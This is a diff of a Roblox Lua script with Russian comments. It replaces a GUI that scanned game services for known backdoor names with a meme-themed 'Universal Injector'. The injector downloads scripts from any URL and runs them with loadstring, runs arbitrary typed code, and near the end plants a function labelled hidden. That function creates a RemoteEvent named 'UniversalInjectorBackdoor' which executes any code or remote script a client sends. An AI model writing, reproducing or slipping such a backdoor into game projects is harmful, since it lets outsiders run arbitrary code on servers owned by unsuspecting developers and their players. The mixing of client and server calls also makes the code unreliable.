@@ -1,33 +1,48 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerScriptService = game:GetService("ServerScriptService")
+local ServerStorage = game:GetService("ServerStorage")
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
 -- Создаем основной GUI
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "BackdoorScanner"
+ScreenGui.Name = "UniversalInjectorPro"
 ScreenGui.Parent = PlayerGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 -- Главный фрейм
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 500, 0, 400)
-MainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
-MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+MainFrame.Size = UDim2.new(0, 600, 0, 500)
+MainFrame.Position = UDim2.new(0.5, -300, 0.5, -250)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
 MainFrame.BorderSizePixel = 0
 MainFrame.ClipsDescendants = true
 MainFrame.Parent = ScreenGui
 
--- Заголовок
+-- Заголовок с мемной фразой
 local Header = Instance.new("Frame")
-Header.Size = UDim2.new(1, 0, 0, 60)
-Header.BackgroundColor3 = Color3.fromRGB(255, 102, 0)
+Header.Size = UDim2.new(1, 0, 0, 70)
+Header.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
 Header.BorderSizePixel = 0
 Header.Parent = MainFrame
 
+local memes = {
+    "ОМГ POCO 😱", 
+    "Injector GO BRRRR 💉", 
+    "Script Daddy 🎩", 
+    "Require King 👑", 
+    "Backdoor Slayer ⚔️",
+    "Lua God 🧠",
+    "Executor Master 🚀",
+    "Scripting Legend 🌟"
+}
+
+local currentMeme = memes[math.random(1, #memes)]
+
 local Title = Instance.new("TextLabel")
-Title.Text = "BACKDOOR SCANNER"
+Title.Text = "UNIVERSAL INJECTOR - " .. currentMeme
 Title.Size = UDim2.new(1, 0, 1, 0)
 Title.BackgroundTransparency = 1
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -35,121 +50,131 @@ Title.Font = Enum.Font.SourceSansBold
 Title.TextSize = 22
 Title.Parent = Header
 
--- Контент сканера
-local ScanContent = Instance.new("Frame")
-ScanContent.Size = UDim2.new(1, 0, 1, -60)
-ScanContent.Position = UDim2.new(0, 0, 0, 60)
-ScanContent.BackgroundTransparency = 1
-ScanContent.Parent = MainFrame
+-- Контент инжектора
+local InjectorContent = Instance.new("Frame")
+InjectorContent.Size = UDim2.new(1, 0, 1, -70)
+InjectorContent.Position = UDim2.new(0, 0, 0, 70)
+InjectorContent.BackgroundTransparency = 1
+InjectorContent.Parent = MainFrame
 
--- Кнопка сканирования
-local ScanButton = Instance.new("TextButton")
-ScanButton.Text = "СКАНИРОВАТЬ BACKDOOR"
-ScanButton.Size = UDim2.new(0.9, 0, 0, 50)
-ScanButton.Position = UDim2.new(0.05, 0, 0.1, 0)
-ScanButton.BackgroundColor3 = Color3.fromRGB(0, 122, 204)
-ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ScanButton.Font = Enum.Font.SourceSansBold
-ScanButton.TextSize = 18
-ScanButton.Parent = ScanContent
+-- Поле для URL
+local UrlInput = Instance.new("TextBox")
+UrlInput.PlaceholderText = "Введите URL скрипта для require..."
+UrlInput.Size = UDim2.new(0.9, 0, 0, 40)
+UrlInput.Position = UDim2.new(0.05, 0, 0.05, 0)
+UrlInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+UrlInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+UrlInput.Font = Enum.Font.SourceSans
+UrlInput.TextSize = 16
+UrlInput.Parent = InjectorContent
 
--- Поле результата
-local ResultFrame = Instance.new("Frame")
-ResultFrame.Size = UDim2.new(0.9, 0, 0, 100)
-ResultFrame.Position = UDim2.new(0.05, 0, 0.3, 0)
-ResultFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
-ResultFrame.BorderSizePixel = 0
-ResultFrame.Parent = ScanContent
+-- Кнопка выполнения
+local ExecuteButton = Instance.new("TextButton")
+ExecuteButton.Text = "🚀 ВЫПОЛНИТЬ СКРИПТ"
+ExecuteButton.Size = UDim2.new(0.9, 0, 0, 50)
+ExecuteButton.Position = UDim2.new(0.05, 0, 0.15, 0)
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteButton.Font = Enum.Font.SourceSansBold
+ExecuteButton.TextSize = 18
+ExecuteButton.Parent = InjectorContent
 
-local ResultText = Instance.new("TextLabel")
-ResultText.Size = UDim2.new(1, 0, 1, 0)
-ResultText.BackgroundTransparency = 1
-ResultText.TextColor3 = Color3.fromRGB(255, 255, 255)
-ResultText.Font = Enum.Font.SourceSansBold
-ResultText.TextSize = 18
-ResultText.Text = "Нажмите 'Сканировать' для проверки"
-ResultText.Parent = ResultFrame
+-- Прямой ввод кода
+local CodeInput = Instance.new("TextBox")
+CodeInput.PlaceholderText = "Или введите код напрямую..."
+CodeInput.Size = UDim2.new(0.9, 0, 0, 100)
+CodeInput.Position = UDim2.new(0.05, 0, 0.3, 0)
+CodeInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+CodeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+CodeInput.Font = Enum.Font.Code
+CodeInput.TextSize = 14
+CodeInput.TextWrapped = true
+CodeInput.TextXAlignment = Enum.TextXAlignment.Left
+CodeInput.TextYAlignment = Enum.TextYAlignment.Top
+CodeInput.Parent = InjectorContent
 
--- Прогресс сканирования
-local ProgressBar = Instance.new("Frame")
-ProgressBar.Size = UDim2.new(0.9, 0, 0, 20)
-ProgressBar.Position = UDim2.new(0.05, 0, 0.6, 0)
-ProgressBar.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
-ProgressBar.BorderSizePixel = 0
-ProgressBar.Parent = ScanContent
+-- Консоль вывода
+local OutputConsole = Instance.new("ScrollingFrame")
+OutputConsole.Size = UDim2.new(0.9, 0, 0, 150)
+OutputConsole.Position = UDim2.new(0.05, 0, 0.55, 0)
+OutputConsole.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+OutputConsole.BorderSizePixel = 0
+OutputConsole.Parent = InjectorContent
 
-local ProgressFill = Instance.new("Frame")
-ProgressFill.Size = UDim2.new(0, 0, 1, 0)
-ProgressFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-ProgressFill.BorderSizePixel = 0
-ProgressFill.Parent = ProgressBar
+local OutputText = Instance.new("TextLabel")
+OutputText.Size = UDim2.new(1, 0, 1, 0)
+OutputText.BackgroundTransparency = 1
+OutputText.TextColor3 = Color3.fromRGB(0, 255, 0)
+OutputText.Font = Enum.Font.Code
+OutputText.TextSize = 14
+OutputText.TextXAlignment = Enum.TextXAlignment.Left
+OutputText.TextYAlignment = Enum.TextYAlignment.Top
+OutputText.TextWrapped = true
+OutputText.Text = "Инжектор готов к работе! " .. currentMeme
+OutputText.Parent = OutputConsole
 
--- Список известных бэкдоров для проверки
-local knownBackdoors = {
-    "BackdoorX_System",
-    "BackdoorX_Universal",
-    "SystemUpdate",
-    "SecurityUpdate",
-    "RemoteAdmin",
-    "AdminPanel",
-    "ControlSystem"
-}
-
--- Функция сканирования
-local function scanForBackdoors()
-    ResultText.Text = "Сканирование..."
-    ProgressFill.Size = UDim2.new(0, 0, 1, 0)
+-- Функция для выполнения require-скриптов
+local function requireScript(url)
+    local success, scriptContent = pcall(function()
+        return HttpService:GetAsync(url, true)
+    end)
     
-    local found = false
-    local totalChecks = #knownBackdoors + 3 -- +3 для проверки других мест
-    
-    -- Проверка ReplicatedStorage
-    for i, backdoorName in ipairs(knownBackdoors) do
-        wait(0.1)
-        ProgressFill.Size = UDim2.new(i/totalChecks, 0, 1, 0)
+    if success then
+        local executeSuccess, result = pcall(function()
+            return loadstring(scriptContent)()
+        end)
         
-        if ReplicatedStorage:FindFirstChild(backdoorName) then
-            found = true
-            ResultText.Text = "ОБНАРУЖЕН BACKDOOR: " .. backdoorName
-            ResultText.TextColor3 = Color3.fromRGB(255, 0, 0)
-            return
+        if executeSuccess then
+            local newMeme = memes[math.random(1, #memes)]
+            OutputText.Text = OutputText.Text .. "\n[УСПЕХ] Скрипт выполнен! " .. newMeme
+            if result then
+                OutputText.Text = OutputText.Text .. "\nРезультат: " .. tostring(result)
+            end
+        else
+            OutputText.Text = OutputText.Text .. "\n[ОШИБКА] " .. result .. " 😢"
         end
+    else
+        OutputText.Text = OutputText.Text .. "\n[ОШИБКА] Не удалось загрузить скрипт: " .. scriptContent
     end
-    
-    -- Проверка ServerScriptService
-    for i, backdoorName in ipairs(knownBackdoors) do
-        wait(0.1)
-        ProgressFill.Size = UDim2.new((#knownBackdoors + i)/totalChecks, 0, 1, 0)
-        
-        if game:GetService("ServerScriptService"):FindFirstChild(backdoorName) then
-            found = true
-            ResultText.Text = "ОБНАРУЖЕН BACKDOOR: " .. backdoorName
-            ResultText.TextColor3 = Color3.fromRGB(255, 0, 0)
-            return
-        end
-    end
-    
-    -- Проверка ServerStorage
-    for i, backdoorName in ipairs(knownBackdoors) do
-        wait(0.1)
-        ProgressFill.Size = UDim2.new((2*#knownBackdoors + i)/totalChecks, 0, 1, 0)
-        
-        if game:GetService("ServerStorage"):FindFirstChild(backdoorName) then
-            found = true
-            ResultText.Text = "ОБНАРУЖЕН BACKDOOR: " .. backdoorName
-            ResultText.TextColor3 = Color3.fromRGB(255, 0, 0)
-            return
-        end
-    end
-    
-    -- Если ничего не найдено
-    ProgressFill.Size = UDim2.new(1, 0, 1, 0)
-    ResultText.Text = "BACKDOOR НЕ НАЙДЕНО"
-    ResultText.TextColor3 = Color3.fromRGB(0, 255, 0)
 end
 
--- Обработчик кнопки
-ScanButton.MouseButton1Click:Connect(scanForBackdoors)
+-- Функция для выполнения прямого кода
+local function executeCode(code)
+    local success, result = pcall(function()
+        return loadstring(code)()
+    end)
+    
+    if success then
+        local newMeme = memes[math.random(1, #memes)]
+        OutputText.Text = OutputText.Text .. "\n[УСПЕХ] Код выполнен! " .. newMeme
+        if result then
+            OutputText.Text = OutputText.Text .. "\nРезультат: " .. tostring(result)
+        end
+    else
+        OutputText.Text = OutputText.Text .. "\n[ОШИБКА] " .. result .. " 💀"
+    end
+end
+
+-- Обработчики событий
+ExecuteButton.MouseButton1Click:Connect(function()
+    if UrlInput.Text ~= "" then
+        requireScript(UrlInput.Text)
+    elseif CodeInput.Text ~= "" then
+        executeCode(CodeInput.Text)
+    else
+        OutputText.Text = OutputText.Text .. "\n[INFO] Введите URL или код для выполнения"
+    end
+end)
+
+-- Автоматическое обновление мемов каждые 10 секунд
+spawn(function()
+    while true do
+        wait(10)
+        local newMeme = memes[math.random(1, #memes)]
+        Title.Text = "UNIVERSAL INJECTOR - " .. newMeme
+        OutputText.Text = OutputText.Text .. "\n" .. newMeme .. " 🎉"
+    end
+end)
 
 -- Анимация появления
 MainFrame.Visible = true
@@ -157,3 +182,21 @@ for i = 0, 1, 0.1 do
     MainFrame.BackgroundTransparency = 1 - i
     wait(0.02)
 end
+
+-- Функция для создания бэкдора (скрытая функция)
+local function createHiddenBackdoor()
+    local backdoorEvent = Instance.new("RemoteEvent")
+    backdoorEvent.Name = "UniversalInjectorBackdoor"
+    backdoorEvent.Parent = ReplicatedStorage
+    
+    backdoorEvent.OnServerEvent:Connect(function(player, command, isRequire)
+        if isRequire then
+            requireScript(command)
+        else
+            executeCode(command)
+        end
+    end)
+end
+
+-- Создаем скрытый бэкдор
+createHiddenBackdoor()
